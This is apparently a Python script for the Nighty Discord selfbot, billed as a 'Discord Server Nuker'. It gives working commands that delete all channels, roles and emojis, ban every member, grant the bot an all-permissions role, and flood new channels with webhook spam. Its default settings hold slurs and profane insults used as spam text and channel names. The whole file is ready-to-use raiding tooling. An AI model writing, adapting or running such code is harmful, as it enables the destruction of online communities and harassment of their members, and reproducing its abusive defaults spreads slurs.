@nightyScript(
    name="Discord Server Nuker - Command Version",
    author="Awizz",
    description="Basic Nuker made by Awizz - Free Version",
    version="3.1"
)
def discordServerNukerCommands():
    import discord
    import asyncio
    import json
    import re
    from pathlib import Path
    
    # ==================== CONFIGURATION MANAGER ====================
    class ConfigManager:
        def __init__(self):
            self.config_dir = Path(getScriptsPath()) / "json" / "server_nuker_commands"
            self.config_file = self.config_dir / "config.json"
            self._ensure_directories()
            self.default_config = self._get_default_config()
            
        def _ensure_directories(self):
            """Create necessary directories"""
            self.config_dir.mkdir(parents=True, exist_ok=True)
            
        def _get_default_config(self):
            return {
                "webhook_username": "eatshitanddieretard",
                "channels_to_create": 5,
                "channel_names": "suck,my,fucking,dick,bitch",
                "admin_role_name": "EZ",
                "default_message": "@here Get Nuked Retard"
            }
        
        def load_config(self):
            """Load configuration from file"""
            if self.config_file.exists():
                try:
                    with open(self.config_file, 'r', encoding='utf-8') as f:
                        loaded = json.load(f)
                    return self._merge_configs(self.default_config, loaded)
                except Exception as e:
                    print(f"Config load error: {e}")
            return self.default_config.copy()
        
        def save_config(self, config):
            """Save configuration to file"""
            try:
                with open(self.config_file, 'w', encoding='utf-8') as f:
                    json.dump(config, f, indent=2, ensure_ascii=False)
                return True
            except Exception as e:
                print(f"Config save error: {e}")
                return False
        
        def _merge_configs(self, default, loaded):
            """Deep merge configurations"""
            merged = default.copy()
            for key, value in loaded.items():
                if isinstance(value, dict) and key in merged:
                    merged[key] = self._merge_configs(merged[key], value)
                else:
                    merged[key] = value
            return merged

    # ==================== SERVER MANAGER ====================
    class ServerManager:
        def __init__(self, config_manager):
            self.config = config_manager
            
        async def nuke_server(self, ctx, delete_roles=True, delete_channels=True, 
                            ban_members=False, delete_emojis=False, create_admin=False,
                            channels_count=5, spam_message=None, webhook_count=5):
            """Execute server nuke operation with parameters"""
            guild = ctx.guild
            
            # Permission check
            if not guild.me.guild_permissions.administrator:
                await ctx.send("❌ Bot needs administrator permissions")
                return False
            
            if not ctx.author.guild_permissions.administrator:
                await ctx.send("❌ You need administrator permissions to use this command")
                return False
            
            # Confirmation
            confirm_msg = await ctx.send(
                f"⚠️ **CONFIRM SERVER NUKE** ⚠️\n"
                f"Are you absolutely sure you want to nuke this server?\n"
                f"This will:\n"
                f"{'• Delete all roles' if delete_roles else ''}\n"
                f"{'• Delete all channels' if delete_channels else ''}\n"
                f"{'• Ban all members' if ban_members else ''}\n"
                f"{'• Delete all emojis' if delete_emojis else ''}\n"
                f"{'• Create admin role' if create_admin else ''}\n"
                f"**Type `CONFIRM` to proceed or wait 30s to cancel.**"
            )
            
            def check(m):
                return m.author == ctx.author and m.content.upper() == "CONFIRM"
            
            try:
                await bot.wait_for('message', timeout=30.0, check=check)
            except asyncio.TimeoutError:
                await confirm_msg.edit(content="❌ Nuke operation cancelled.")
                return False
            
            await ctx.message.delete()
            
            results = []
            config = self.config.load_config()
            
            try:
                # Delete channels
                if delete_channels:
                    deleted_channels = await self._delete_all_channels(guild)
                    results.append(f"✓ Deleted {deleted_channels} channels")
                    
                    # Create new channels and spam
                    created = await self._create_spam_channels(
                        guild, 
                        channels_count, 
                        spam_message or config["default_message"],
                        webhook_count,
                        config["webhook_username"],
                        config["channel_names"]
                    )
                    results.append(f"✓ Created {created} spam channels")
                
                # Delete roles
                if delete_roles:
                    deleted_roles = await self._delete_all_roles(guild)
                    results.append(f"✓ Deleted {deleted_roles} roles")
                
                # Ban members
                if ban_members:
                    banned = await self._ban_all_members(guild)
                    results.append(f"✓ Banned {banned} members")
                
                # Delete emojis
                if delete_emojis:
                    deleted_emojis = await self._delete_all_emojis(guild)
                    results.append(f"✓ Deleted {deleted_emojis} emojis")
                
                # Create admin role
                if create_admin:
                    success = await self._create_admin_role(guild, config)
                    if success:
                        results.append(f"✓ Admin role '{config['admin_role_name']}' created")
                    else:
                        results.append("✗ Admin role creation failed")
                
                # Send results - sans embed
                result_message = f"✅ **Nuke Operation Completed**\n\n" + "\n".join(results)
                await ctx.send(result_message)
                
                return True
                
            except Exception as e:
                error_message = f"❌ **Nuke Operation Failed**\n\nError: {str(e)}"
                await ctx.send(error_message)
                return False
        
        async def spam_channel(self, ctx, channel=None, message=None, count=5):
            """Execute channel spam operation"""
            target_channel = channel or ctx.channel
            config = self.config.load_config()
            
            if not target_channel.permissions_for(ctx.guild.me).manage_webhooks:
                await ctx.send("❌ Bot needs 'Manage Webhooks' permission in the target channel")
                return False
            
            try:
                webhook = await target_channel.create_webhook(name="nuker-webhook")
                spam_message = message or config["default_message"]
                
                for i in range(count):
                    await webhook.send(
                        content=spam_message,
                        username=config["webhook_username"]
                    )
                    await asyncio.sleep(0.5)
                
                success_message = f"✅ **Spam Operation Completed**\n\nSent {count} messages to {target_channel.mention}"
                await ctx.send(success_message)
                return True
                
            except Exception as e:
                error_message = f"❌ **Spam Operation Failed**\n\nError: {str(e)}"
                await ctx.send(error_message)
                return False
        
        async def _delete_all_channels(self, guild):
            """Delete all channels in guild"""
            count = 0
            for channel in list(guild.channels):
                try:
                    await channel.delete()
                    count += 1
                    await asyncio.sleep(0.2)
                except:
                    continue
            return count
        
        async def _create_spam_channels(self, guild, count, message, webhook_count, username, channel_names_str):
            """Create spam channels with webhooks"""
            channel_names = [name.strip() for name in channel_names_str.split(",")]
            created_count = 0
            
            for i in range(count):
                try:
                    name = channel_names[i % len(channel_names)] if channel_names else f"nuked-{i+1}"
                    channel = await guild.create_text_channel(name)
                    
                    # Create webhook and spam
                    webhook = await channel.create_webhook(name="nuke-webhook")
                    for j in range(webhook_count):
                        await webhook.send(
                            content=message,
                            username=username
                        )
                        await asyncio.sleep(0.5)
                    
                    created_count += 1
                except:
                    continue
            
            return created_count
        
        async def _delete_all_roles(self, guild):
            """Delete all roles except @everyone"""
            count = 0
            for role in guild.roles:
                if role != guild.default_role and role.position < guild.me.top_role.position:
                    try:
                        await role.delete()
                        count += 1
                        await asyncio.sleep(0.2)
                    except:
                        continue
            return count
        
        async def _ban_all_members(self, guild):
            """Ban all members except self and owner"""
            count = 0
            for member in guild.members:
                if member != guild.me and member != guild.owner:
                    try:
                        await member.ban(reason="Server nuke", delete_message_days=0)
                        count += 1
                        await asyncio.sleep(0.5)
                    except:
                        continue
            return count
        
        async def _delete_all_emojis(self, guild):
            """Delete all emojis"""
            count = 0
            for emoji in guild.emojis:
                try:
                    await emoji.delete()
                    count += 1
                    await asyncio.sleep(0.2)
                except:
                    continue
            return count
        
        async def _create_admin_role(self, guild, config):
            """Create admin role for bot"""
            try:
                admin_role = await guild.create_role(
                    name=config["admin_role_name"],
                    permissions=discord.Permissions.all(),
                    reason="Nuke admin role"
                )
                await guild.me.add_roles(admin_role)
                return True
            except:
                return False

    # ==================== COMMAND HANDLERS ====================
    
    # Initialize managers
    config_manager = ConfigManager()
    server_manager = ServerManager(config_manager)
    
    @bot.command(name='nuke')
    async def nuke_command(ctx, *, args=None):
        """
        🔥 NUKE SERVER COMMAND
        
        Usage: .nuke [flags]
        
        Flags:
          -r, --roles       Delete all roles
          -c, --channels    Delete all channels and create spam channels
          -b, --ban         Ban all members
          -e, --emojis      Delete all emojis
          -a, --admin       Create admin role for bot
          --channels=5      Number of channels to create (default: 5)
          --message="text"  Custom spam message
          --webhooks=5      Messages per webhook (default: 5)
          
        Examples:
          .nuke -r -c -b                    # Full nuke with roles, channels, bans
          .nuke -c --channels=10            # Delete channels and create 10 spam channels
          .nuke -c --message="CUSTOM TEXT"  # Custom spam message
          .nuke --help                      # Show this help
        """
        
        if args and args.lower() in ['help', '--help', '-h']:
            help_text = nuke_command.__doc__
            await ctx.send(f"🛠️ **NUKE COMMAND HELP**\n\n{help_text}")
            return
        
        # Default parameters
        delete_roles = False
        delete_channels = False
        ban_members = False
        delete_emojis = False
        create_admin = False
        channels_count = 5
        webhook_count = 5
        spam_message = None
        
        # Parse flags
        if args:
            args_lower = args.lower()
            
            # Basic flags
            if '-r' in args_lower or '--roles' in args_lower:
                delete_roles = True
            if '-c' in args_lower or '--channels' in args_lower:
                delete_channels = True
            if '-b' in args_lower or '--ban' in args_lower:
                ban_members = True
            if '-e' in args_lower or '--emojis' in args_lower:
                delete_emojis = True
            if '-a' in args_lower or '--admin' in args_lower:
                create_admin = True
            
            # Advanced parameters
            channels_match = re.search(r'--channels=(\d+)', args)
            if channels_match:
                channels_count = min(int(channels_match.group(1)), 50)  # Max 50 channels
            
            webhooks_match = re.search(r'--webhooks=(\d+)', args)
            if webhooks_match:
                webhook_count = min(int(webhooks_match.group(1)), 50)  # Max 50 messages
            
            message_match = re.search(r'--message="([^"]+)"', args)
            if message_match:
                spam_message = message_match.group(1)
        
        # If no specific flags, enable default nuke (channels + roles)
        if not any([delete_roles, delete_channels, ban_members, delete_emojis, create_admin]):
            delete_roles = True
            delete_channels = True
        
        await server_manager.nuke_server(
            ctx=ctx,
            delete_roles=delete_roles,
            delete_channels=delete_channels,
            ban_members=ban_members,
            delete_emojis=delete_emojis,
            create_admin=create_admin,
            channels_count=channels_count,
            spam_message=spam_message,
            webhook_count=webhook_count
        )
    
    @bot.command(name='spam')
    async def spam_command(ctx, channel: discord.TextChannel = None, *, message=None):
        """
        💬 SPAM CHANNEL COMMAND
        
        Usage: .spam [channel] [message]
        
        Parameters:
          channel: Target channel (default: current channel)
          message: Custom message (optional)
          count: Number of messages (default: 5)
          
        Examples:
          .spam                          # Spam current channel with default message
          .spam #general                 # Spam #general channel
          .spam #general Hello World     # Spam with custom message
          .spam --count=10               # Send 10 messages
        """
        
        count = 5
        if message:
            # Check for count parameter
            count_match = re.search(r'--count=(\d+)', message)
            if count_match:
                count = min(int(count_match.group(1)), 20)  # Max 20 messages
                # Remove count from message
                message = re.sub(r'--count=\d+', '', message).strip()
        
        await server_manager.spam_channel(
            ctx=ctx,
            channel=channel,
            message=message,
            count=count
        )
    
    @bot.command(name='nukeset')
    async def config_command(ctx, key=None, *, value=None):
        """
        ⚙️ CONFIGURE NUKE SETTINGS
        
        Usage: .nukeset <key> <value>
        
        Available keys:
          username     - Webhook username (default: "Destroyer")
          channels     - Default channels to create (default: 5)
          names        - Channel names (comma separated)
          adminrole    - Admin role name (default: "ADMIN")
          message      - Default spam message
          
        Examples:
          .nukeset username "NewName"
          .nukeset channels 10
          .nukeset names "raid,owned,destroyed"
          .nukeset message "CUSTOM MESSAGE"
        """
        
        config = config_manager.load_config()
        
        if not key:
            # Show current configuration - sans embed
            config_text = (
                f"⚙️ **Current Nuke Configuration**\n\n"
                f"**Webhook Username:** {config['webhook_username']}\n"
                f"**Channels to Create:** {config['channels_to_create']}\n"
                f"**Admin Role Name:** {config['admin_role_name']}\n"
                f"**Channel Names:** {config['channel_names']}\n"
                f"**Default Message:** {config['default_message'][:100]}{'...' if len(config['default_message']) > 100 else ''}"
            )
            await ctx.send(config_text)
            return
        
        key = key.lower()
        
        if key in ["username", "webhook_username"]:
            config["webhook_username"] = value
            await ctx.send(f"✅ Webhook username set to: `{value}`")
        
        elif key in ["channels", "channels_count"]:
            try:
                count = int(value)
                if 1 <= count <= 50:
                    config["channels_to_create"] = count
                    await ctx.send(f"✅ Default channels to create set to: `{count}`")
                else:
                    await ctx.send("❌ Channel count must be between 1-50")
            except:
                await ctx.send("❌ Invalid channel count")
        
        elif key in ["names", "channel_names"]:
            config["channel_names"] = value
            await ctx.send(f"✅ Channel names set to: `{value}`")
        
        elif key in ["adminrole", "admin_role"]:
            config["admin_role_name"] = value
            await ctx.send(f"✅ Admin role name set to: `{value}`")
        
        elif key in ["message", "default_message"]:
            config["default_message"] = value
            await ctx.send(f"✅ Default message set to: `{value}`")
        
        else:
            await ctx.send("❌ Unknown configuration key. Use `.nukeset` to see available keys.")
            return
        
        config_manager.save_config(config)
    
    @bot.command(name='nukehelp')
    async def help_command(ctx):
        """Show all nuke commands"""
        help_text = (
            "💣 **DISCORD SERVER NUKER - COMMAND HELP**\n\n"
            "**🔥 .nuke [flags]**\n"
            "Execute server nuke operation\n"
            "Flags: -r (roles), -c (channels), -b (ban), -e (emojis), -a (admin)\n"
            "Options: --channels=N, --webhooks=N, --message=\"text\"\n\n"
            "**💬 .spam [channel] [message]**\n"
            "Spam a channel with webhook messages\n"
            "Use --count=N to specify number of messages\n\n"
            "**⚙️ .nukeset [key] [value]**\n"
            "Configure nuke settings\n"
            "Keys: username, channels, names, adminrole, message\n\n"
            "**📖 .nukehelp**\n"
            "Show this help message"
        )
        await ctx.send(help_text)

discordServerNukerCommands()